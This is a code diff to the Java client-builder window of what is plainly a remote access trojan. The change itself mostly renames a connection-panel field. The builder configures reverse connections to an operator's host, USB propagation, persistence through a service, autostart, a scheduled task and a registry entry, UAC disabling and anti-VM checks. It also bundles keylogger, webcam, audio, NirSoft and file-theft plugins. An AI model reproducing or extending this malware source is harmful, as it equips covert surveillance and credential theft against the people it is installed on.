@@ -57,7 +57,7 @@ public class CrearCliente extends JFrame {
     private JFileChooser cd = new JFileChooser();
     private JButton btnCrearCliente;
     private JButton btnGuardarPerfiles;
-    private ConexionPanel panConexion;
+    private ConexionPanel panelConexion;
     private CifradoPanel panelCifrado;
     private InstalarPanel panelInstalar;
     private PropagarPanel panelPropagacion;
@@ -191,7 +191,7 @@ public class CrearCliente extends JFrame {
             }
         }
         cargarPerfil(perfil);
-        this.tabs.addTab("Conexión", Util.cargarIcono16("/resources/connect.png"), this.panConexion);
+        this.tabs.addTab("Conexión", Util.cargarIcono16("/resources/connect.png"), this.panelConexion);
         this.tabs.addTab("Instalar", Util.cargarIcono16("/resources/puerto.png"), this.panelInstalar);
         this.tabs.addTab("Cifrado", Util.cargarIcono16("/resources/key.png"), this.panelCifrado);
         this.tabs.addTab("Propagación", Util.cargarIcono16("/resources/virus.png"), this.panelPropagacion);
@@ -241,26 +241,26 @@ public class CrearCliente extends JFrame {
 
     private void cargarPerfil(Perfil p) {
         try {
-            panConexion.getPrefijo().setText((String) p.obtenerParametro("prefijo"));
+            panelConexion.getPrefijo().setText((String) p.obtenerParametro("prefijo"));
 
-            this.panConexion.getTxtIpDNS().setText((String) p.obtenerParametro("dns"));
-            this.panConexion.getPassword().setText((String) p.obtenerParametro("password"));
+            this.panelConexion.getTxtIpDNS().setText((String) p.obtenerParametro("dns"));
+            this.panelConexion.getPassword().setText((String) p.obtenerParametro("password"));
 
             try {
-                this.panConexion.getComboProtocolo().setSelectedIndex((int) p.obtenerParametro("tipoConexion"));
+                this.panelConexion.getComboProtocolo().setSelectedIndex((int) p.obtenerParametro("tipoConexion"));
             } catch (Exception e) {
 
             }
 
             try {
-                this.panConexion.getChkSSL().setSelected(Boolean.valueOf((String) p.obtenerParametro("ssl")));
+                this.panelConexion.getChkSSL().setSelected(Boolean.valueOf((String) p.obtenerParametro("ssl")));
             } catch (Exception e) {
 
             }
-            this.panConexion.getPuerto().setValue(Integer.parseInt((String) p.obtenerParametro("puerto")));
+            this.panelConexion.getPuerto().setValue(Integer.parseInt((String) p.obtenerParametro("puerto")));
 //            this.panConexion.getPuerto2().setValue(Integer.parseInt((String) p.obtenerParametro("puerto2")));
-            this.panConexion.getDelay().setValue(Integer.parseInt((String) p.obtenerParametro("delay")));
-            this.panConexion.getConexionInversa().setSelected(Boolean.valueOf((String) p.obtenerParametro("inversa")));
+            this.panelConexion.getTxtDelay().setText((String) p.obtenerParametro("delay"));
+            this.panelConexion.getConexionInversa().setSelected(Boolean.valueOf((String) p.obtenerParametro("inversa")));
             this.panelCifrado.getKey().setText((String) p.obtenerParametro("clave_acceso"));
             try {
                 this.panelEspiar.getCapturaOfflinePantalla().setSelected((Boolean) p.obtenerParametro("off-escritorio"));
@@ -295,32 +295,25 @@ public class CrearCliente extends JFrame {
 
     private void setearPerfil(File a) {
 
-        perfil.agregarParametro("prefijo", this.panConexion.getPrefijo().getText());
-
-        perfil.agregarParametro("dns", this.panConexion.getTxtIpDNS().getText());
-        perfil.agregarParametro("password", panConexion.getPassword().getText());
-
-        perfil.agregarParametro("tipoConexion", panConexion.getComboProtocolo().getSelectedIndex());
-        perfil.agregarParametro("ssl", String.valueOf(panConexion.getChkSSL().isSelected()));
-        perfil.agregarParametro("puerto", panConexion.getPuerto().getValue().toString());
-        perfil.agregarParametro("delay", String.valueOf(panConexion.getDelay().getValue()));
-
+        perfil.agregarParametro("prefijo", this.panelConexion.getPrefijo().getText());
+        perfil.agregarParametro("dns", this.panelConexion.getTxtIpDNS().getText());
+        perfil.agregarParametro("password", panelConexion.getPassword().getText());
+        perfil.agregarParametro("tipoConexion", panelConexion.getComboProtocolo().getSelectedIndex());
+        perfil.agregarParametro("ssl", String.valueOf(panelConexion.getChkSSL().isSelected()));
+        perfil.agregarParametro("puerto", panelConexion.getPuerto().getValue().toString());
+        perfil.agregarParametro("delay", panelConexion.getTxtDelay().getText());
         perfil.agregarParametro("off-escritorio", this.panelEspiar.getCapturaOfflinePantalla().isSelected());
         perfil.agregarParametro("off-escritorio-delay", this.panelEspiar.getDelayCapturaPantalla().getValue());
-
         perfil.agregarParametro("usb", String.valueOf(panelPropagacion.getCheckUSB().isSelected()));
         perfil.agregarParametro("nombre_usb", panelPropagacion.getNombreUSB().getText());
         perfil.agregarParametro("clave_acceso", panelCifrado.getKey().getText());
-
         perfil.agregarParametro("instalar", String.valueOf(panelInstalar.getLblAutoInicio().isSelected()));
         perfil.agregarParametro("servicio", String.valueOf(panelInstalar.getServicio().isSelected()));
         perfil.agregarParametro("autoinicio", String.valueOf(panelInstalar.getAutoinicio().isSelected()));
         perfil.agregarParametro("prog_tareas", String.valueOf(panelInstalar.getProgramadorTarea().isSelected()));
         perfil.agregarParametro("reg_name", panelInstalar.getRegName().getText());
         perfil.agregarParametro("jar_name", panelInstalar.getFilename().getText());
-
-        perfil.agregarParametro("inversa", String.valueOf(this.panConexion.getConexionInversa().isSelected()));
-
+        perfil.agregarParametro("inversa", String.valueOf(this.panelConexion.getConexionInversa().isSelected()));
         perfil.agregarParametro("fn_camara", String.valueOf(panelOpciones.getFn_capturaCamara().isSelected()));
         perfil.agregarParametro("fn_uac", String.valueOf(panelOpciones.getFn_desUAC().isSelected()));
         perfil.agregarParametro("fn_ventana", String.valueOf(panelOpciones.getFn_Ventana().isSelected()));
@@ -328,12 +321,10 @@ public class CrearCliente extends JFrame {
         perfil.agregarParametro("fn_audio", String.valueOf(panelOpciones.getFn_capturaAudio().isSelected()));
         perfil.agregarParametro("fn_buscararchivos", String.valueOf(panelOpciones.getFn_buscarArchivos().isSelected()));
         perfil.agregarParametro("fn_descarga_archivos", String.valueOf(panelOpciones.getFn_descargararchivos().isSelected()));
-
         perfil.agregarParametro("pg_camara", String.valueOf(panelPlugins.getAdjuntarPluginsWebCam().isSelected()));
         perfil.agregarParametro("pg_keylogger", String.valueOf(panelPlugins.getAdjuntarPluginsKeylogger().isSelected()));
         perfil.agregarParametro("pg_jna", String.valueOf(panelPlugins.getAdjuntarPluginsJNA().isSelected()));
         perfil.agregarParametro("pg_nirsoft", String.valueOf(panelPlugins.getAdjuntarPluginsNirsoft().isSelected()));
-
         perfil.agregarParametro("version_objeto", "true");//esta version de perfil es con objetos, entonces en su listener se crea una isntanacia del AsociadoV2
 
         if (a != null) {
@@ -372,7 +363,7 @@ public class CrearCliente extends JFrame {
         this.tabs = new JTabbedPane();
         tabs.setTabPlacement(JTabbedPane.LEFT);
         panelCifrado = new CifradoPanel();
-        this.panConexion = new ConexionPanel();
+        this.panelConexion = new ConexionPanel();
         this.panelInstalar = new InstalarPanel();
         this.panelPropagacion = new PropagarPanel();
         panelOpciones = new FuncionesPanel();
@@ -538,26 +529,26 @@ public class CrearCliente extends JFrame {
     private CFG armarArchivoConfig() {
 
         int protocolo = 1;
-        if (panConexion.getComboProtocolo().getSelectedItem().toString().equals("UDP")) {
+        if (panelConexion.getComboProtocolo().getSelectedItem().toString().equals("UDP")) {
             protocolo = 2;
         } else {
             protocolo = 1;
         }
 
         int tipoConexion = 1;
-        if (panConexion.getConexionInversa().isSelected()) {
+        if (panelConexion.getConexionInversa().isSelected()) {
             tipoConexion = 1;
         } else {
             tipoConexion = 2;
         }
 
         CFG cfg = new CFG();
-        cfg.agregarParametro("prefijo", this.panConexion.getPrefijo().getText());
+        cfg.agregarParametro("prefijo", this.panelConexion.getPrefijo().getText());
         cfg.agregarParametro("claveClase", this.panelCifrado.getKey().getText());
-        cfg.agregarParametro("dns", panConexion.getTxtIpDNS().getText());
-        cfg.agregarParametro("password", Encriptacion.MD5(new String(panConexion.getPassword().getPassword())));
-        cfg.agregarParametro("puerto", Integer.valueOf(this.panConexion.getPuerto().getValue().toString()));
-        cfg.agregarParametro("delay", panConexion.getDelay().getValue());
+        cfg.agregarParametro("dns", panelConexion.getTxtIpDNS().getText());
+        cfg.agregarParametro("password", Encriptacion.MD5(new String(panelConexion.getPassword().getPassword())));
+        cfg.agregarParametro("puerto", Integer.valueOf(this.panelConexion.getPuerto().getValue().toString()));
+        cfg.agregarParametro("delay", Integer.valueOf(panelConexion.getTxtDelay().getText()));
         cfg.agregarParametro("avmw", panelANTIVM.getAntiVM_windows().isSelected());
         cfg.agregarParametro("avml", panelANTIVM.getAntiVM_linux().isSelected());
 
@@ -568,7 +559,7 @@ public class CrearCliente extends JFrame {
         //--camara
 
         cfg.agregarParametro("tipoConexion", tipoConexion);
-        cfg.agregarParametro("ssl", panConexion.getChkSSL().isSelected());
+        cfg.agregarParametro("ssl", panelConexion.getChkSSL().isSelected());
         cfg.agregarParametro("protocolo", protocolo);
         cfg.agregarParametro("uac", this.panelOpciones.getFn_desUAC().isSelected());
         cfg.agregarParametro("gui", this.panelOpciones.getFn_Ventana().isSelected());
@@ -611,14 +602,14 @@ public class CrearCliente extends JFrame {
                 agregarLog("=======================================================");
 
                 String protocolo = "1";
-                if (panConexion.getComboProtocolo().getSelectedItem().toString().equals("UDP")) {
+                if (panelConexion.getComboProtocolo().getSelectedItem().toString().equals("UDP")) {
                     protocolo = "2";
                 } else {
                     protocolo = "1";
                 }
 
                 String tipoConexion = "1";
-                if (panConexion.getConexionInversa().isSelected()) {
+                if (panelConexion.getConexionInversa().isSelected()) {
                     tipoConexion = "1";
                 } else {
                     tipoConexion = "2";
@@ -881,7 +872,7 @@ public class CrearCliente extends JFrame {
         }
 
         if (clase.contains("rt/CONAR.class")) {//Conexion de archivos en caso de conexion directa
-            return !this.panConexion.getConexionInversa().isSelected();
+            return !this.panelConexion.getConexionInversa().isSelected();
         }
 
         if (clase.contains("rt/modulos/var/COFF.class")) {//captura offline
